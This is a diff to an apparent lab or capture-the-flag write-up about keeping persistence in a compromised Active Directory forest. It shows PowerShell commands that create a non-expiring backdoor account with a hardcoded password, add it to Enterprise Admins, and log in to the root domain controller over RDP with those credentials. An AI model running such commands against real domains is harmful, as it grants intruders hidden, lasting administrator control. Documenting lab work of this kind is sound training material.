@@ -8,7 +8,7 @@ In order to maintain persistence, and allowing us to login without creating tick
 
 PS C:\Users\Administrator>`$pwd = convertTo-SecureString "Capstone1@" -AsPlainText -Force`
 
-PS C:\Users\Administrator>`New-ADUser -Name "kairosroot" -AccountPassword $pwd `
+PS C:\Users\Administrator> `New-ADUser -Name "kairosroot" -AccountPassword $pwd -PasswordNeverExpires $true -Enabled $true`
 
 PS C:\Users\Administrator>`$User = Get-ADUser -Identity "kairosroot"  -Server "corpdc.corp.thereserve.loc"`
 
@@ -16,15 +16,14 @@ PS C:\Users\Administrator>`$Group = Get-ADGroup -Identity "Enterprise Admins" -S
 
 PS C:\Users\Administrator>`Add-ADGroupMember -Identity $Group -Members $User -Server "rootdc.thereserve.loc"`
 
+
 ![[Maintain persistence-20240613153305218.webp]]
 
-## Check out the user and group
-
-<span style="background:#d4b106">CHANGE IMAGES</span>
+### Check out the user and group
 
 PS C:\Users\Administrator> `echo $user`
 
-![[Maintain persistence-20240613153842909.webp]]
+![[Maintain persistence-20240616142921373.webp]]
 
 PS C:\Users\Administrator> `echo $group`
 
@@ -34,6 +33,8 @@ PS C:\Users\Administrator> `echo $group`
 ## RDP to ROOTDC
 
 With our new created user, we can just login in the ROOTDC as an Enterprise Admin.
+
+Computer: `10.200.X.100`
 
 ### Connecting from a Client Machine
 
@@ -47,10 +48,15 @@ With our new created user, we can just login in the ROOTDC as an Enterprise Admi
 3. **Enter Credentials**:
     
     - When prompted, enter the username and password for the account on the host machine.
-4. **Optional: Save Connection Settings**:
+    - Username: `kairosroot`
+    - Password: `Capstone1@`
+1. **Optional: Save Connection Settings**:
     
     - You can save the connection settings to an RDP file by clicking on **Show Options** > **Save As**.
 5. **Connect**:
     
     - Click **Connect** to start the remote session.
 
+    ![[Maintain persistence-20240616151550123.webp]]
+
+**Next step:** [[RDP to BANKDC from host CORPDC]]
